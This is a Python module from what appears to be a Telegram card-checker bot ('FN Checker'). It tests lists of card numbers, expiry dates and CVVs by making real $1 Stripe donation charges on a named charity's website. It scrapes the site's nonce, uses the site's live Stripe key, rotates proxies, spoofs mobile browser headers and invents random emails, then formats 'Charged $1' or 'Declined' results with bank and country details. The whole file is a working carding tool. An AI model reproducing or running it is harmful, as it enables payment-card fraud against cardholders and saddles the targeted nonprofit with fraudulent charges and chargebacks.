# stripe1dollar.py - Gate 2: Stripe $1 Charge (harlemstemup.com)
import aiohttp
import asyncio
import re
import random
import string
import json
import logging
from datetime import datetime

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class StripeChargeGate:
    def __init__(self):
        self.proxy_pool = []
        self.request_timeout = aiohttp.ClientTimeout(total=70)
        self.stripe_key = "pk_live_51KwTSgIKstDXlptU5k6wY2BYJxjTdS0UOcymscxrSFacKEyKZL8V5XAfA9hLw67KtG6ZlY1wE7ToVqPi2OCsFBp100liJubbpN"
        self.base_url = "https://harlemstemup.com"
        self.bin_cache = {}

    def load_proxies(self):
        import os
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_pool = [line.strip() for line in f if line.strip()]

    def generate_random_email(self):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com"]
        username_length = random.randint(6, 12)
        username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(username_length))
        domain = random.choice(domains)
        return f"{username}@{domain}"

    def generate_random_time(self):
        return str(random.randint(30000, 120000))

    async def fetch_bin_info(self, bin_number):
        try:
            if bin_number in self.bin_cache:
                return self.bin_cache[bin_number]
            
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as response:
                    if response.status == 200:
                        data = await response.json()
                        self.bin_cache[bin_number] = {
                            'bin': data.get('bin', 'N/A'),
                            'brand': data.get('brand', 'N/A'),
                            'country': data.get('country_name', 'N/A'),
                            'country_flag': data.get('country_flag', ''),
                            'country_currencies': data.get('country_currencies', ['N/A']),
                            'bank': data.get('bank', 'N/A'),
                            'level': data.get('level', 'N/A'),
                            'type': data.get('type', 'N/A')
                        }
                        return self.bin_cache[bin_number]
        except Exception as e:
            logger.error(f"BIN lookup error: {str(e)}")
        return None

    async def process_card(self, combo):
        """Stripe $1 Charge Gate processing logic (harlemstemup.com)"""
        start_time = datetime.now()
        error_message = None
        status = "charged"
        
        try:
            if len(combo.split("|")) < 4:
                return False, status, "Invalid card format"

            proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
            
            card_data = combo.split("|")
            cc = card_data[0]
            mm = card_data[1]
            yy = card_data[2]
            cvv = card_data[3]
            
            if len(yy) == 4:
                yy = yy[2:]

            email = self.generate_random_email()

            headers = {
                "Host": "harlemstemup.com",
                "Connection": "keep-alive",
                "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.39 Mobile Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "dnt": "1",
                "X-Requested-With": "mark.via.gp",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            }

            async with aiohttp.ClientSession(timeout=self.request_timeout) as session:
                async with session.get(f'{self.base_url}/donate/', headers=headers, proxy=proxy) as response:
                    response_text = await response.text()
                    
                    security_nonce_match = re.search(r'"security":"(.*?)"', response_text)
                    if not security_nonce_match:
                        return False, status, "Security nonce not found"
                    security_nonce = security_nonce_match.group(1)
                    
                    idempotency_match = re.search(r'"idempotency":"(.*?)"', response_text)
                    if not idempotency_match:
                        return False, status, "Idempotency token not found"
                    idempotency = idempotency_match.group(1)

                ajax_headers = {
                    "Host": "harlemstemup.com",
                    "Connection": "keep-alive",
                    "sec-ch-ua-platform": '"Android"',
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.39 Mobile Safari/537.36",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "sec-ch-ua-mobile": "?1",
                    "Origin": "https://harlemstemup.com",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://harlemstemup.com/donate/",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
                }
                
                donation_data = {
                    "action": "wpsd_donation",
                    "name": "Vip op",
                    "email": email,
                    "amount": "1",
                    "donation_for": "Harlem STEM Up!",
                    "currency": "USD",
                    "idempotency": idempotency,
                    "security": security_nonce,
                    "stripeSdk": ""
                }
                
                async with session.post(f'{self.base_url}/wp-admin/admin-ajax.php', headers=ajax_headers, data=donation_data, proxy=proxy) as response:
                    response_text = await response.text()
                    try:
                        response_json = json.loads(response_text)
                        client_secret = response_json.get("data", {}).get("client_secret", None)
                        
                        if not client_secret:
                            return False, status, "Failed to get client secret"
                    except Exception as e:
                        return False, status, f"Error parsing response: {str(e)}"

                payment_intent_id = client_secret.split('_secret_')[0] if '_secret_' in client_secret else None
                
                if not payment_intent_id:
                    return False, status, "Failed to extract payment intent ID"

                stripe_headers = {
                    "Host": "api.stripe.com",
                    "sec-ch-ua-platform": '"Android"',
                    "user-agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.39 Mobile Safari/537.36",
                    "accept": "application/json",
                    "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
                    "content-type": "application/x-www-form-urlencoded",
                    "sec-ch-ua-mobile": "?1",
                    "origin": "https://js.stripe.com",
                    "x-requested-with": "mark.via.gp",
                    "sec-fetch-site": "same-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://js.stripe.com/",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
                    "priority": "u=1, i"
                }
                
                payload = {
                    "payment_method_data[type]": "card",
                    "payment_method_data[billing_details][name]": "Vip op",
                    "payment_method_data[billing_details][email]": email,
                    "payment_method_data[card][number]": cc,
                    "payment_method_data[card][cvc]": cvv,
                    "payment_method_data[card][exp_month]": mm,
                    "payment_method_data[card][exp_year]": yy,
                    "payment_method_data[guid]": "NA",
                    "payment_method_data[muid]": "NA",
                    "payment_method_data[sid]": "NA",
                    "payment_method_data[payment_user_agent]": "stripe.js/6a9fcf70ea; stripe-js-v3/6a9fcf70ea; card-element",
                    "payment_method_data[referrer]": "https://harlemstemup.com",
                    "payment_method_data[time_on_page]": self.generate_random_time(),
                    "expected_payment_method_type": "card",
                    "use_stripe_sdk": "true",
                    "key": self.stripe_key,
                    "client_secret": client_secret
                }
                
                async with session.post(f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm', headers=stripe_headers, data=payload, proxy=proxy) as stripe_res:
                    stripe_response_text = await stripe_res.text()
                    logger.info(f"Stripe confirm response: {stripe_response_text}")
                    
                    try:
                        stripe_json = json.loads(stripe_response_text)
                        
                        if stripe_json.get("status") == "succeeded":
                            check_time = (datetime.now() - start_time).total_seconds()
                            return combo, status, None
                        elif stripe_json.get("status") == "requires_action":
                            return combo, "3d_secure", "3D Secure Required"
                        elif "error" in stripe_json:
                            error_message = stripe_json["error"].get("message", "Payment failed")
                            return False, status, error_message
                        else:
                            error_message = stripe_json.get("last_payment_error", {}).get("message", "Card declined")
                            return False, status, error_message
                    except json.JSONDecodeError:
                        return False, status, "Invalid response from Stripe"

        except aiohttp.ClientError as e:
            error_message = f"Network error: {str(e)}"
            return False, status, error_message
        except asyncio.TimeoutError:
            error_message = "Request timeout"
            return False, status, error_message
        except Exception as e:
            logger.error(f"Processing error: {str(e)}")
            error_message = f"System error: {str(e)}"
            return False, status, error_message

    async def format_approval_message(self, combo, bin_info, check_time, user):
        bin_info = bin_info or {}
        username = f"@{user.username}" if user.username else user.full_name
        return f"""
<b>FN Checker</b>
- - - - - - - - - - - - - - - - - - - - - - - -
[⌯] <b>Card</b> ⌁ <code>{combo}</code>
[⌯] <b>Status</b> ⌁ Charged $1 ✅
[⌯] <b>Result</b> ⌁ Payment Successful

[⌯] <b>Bin</b> ⌁ {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}
[⌯] <b>Bank</b> ⌁ {bin_info.get('bank', 'N/A')}
[⌯] <b>Country</b> ⌁ {bin_info.get('country', 'N/A')} {bin_info.get('country_flag', '')}

[⌯] <b>Gate</b> ⌁ Stripe Charge $1
[⌯] <b>Time</b> ⌁ {check_time:.2f}s
[⌯] <b>Used By</b> ⌁ {username}
- - - - - - - - - - - - - - - - - - - - - - - -
"""

    async def format_declined_message(self, combo, bin_info, check_time, error_message, user):
        bin_info = bin_info or {}
        username = f"@{user.username}" if user.username else user.full_name
        return f"""
<b>FN Checker</b>
- - - - - - - - - - - - - - - - - - - - - - - -
[⌯] <b>Card</b> ⌁ <code>{combo}</code>
[⌯] <b>Status</b> ⌁ Declined ❌
[⌯] <b>Result</b> ⌁ {error_message or 'Your card was declined.'}

[⌯] <b>Bin</b> ⌁ {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}
[⌯] <b>Bank</b> ⌁ {bin_info.get('bank', 'N/A')}
[⌯] <b>Country</b> ⌁ {bin_info.get('country', 'N/A')} {bin_info.get('country_flag', '')}

[⌯] <b>Gate</b> ⌁ Stripe Charge $1
[⌯] <b>Time</b> ⌁ {check_time:.2f}s
[⌯] <b>Used By</b> ⌁ {username}
- - - - - - - - - - - - - - - - - - - - - - - -
"""
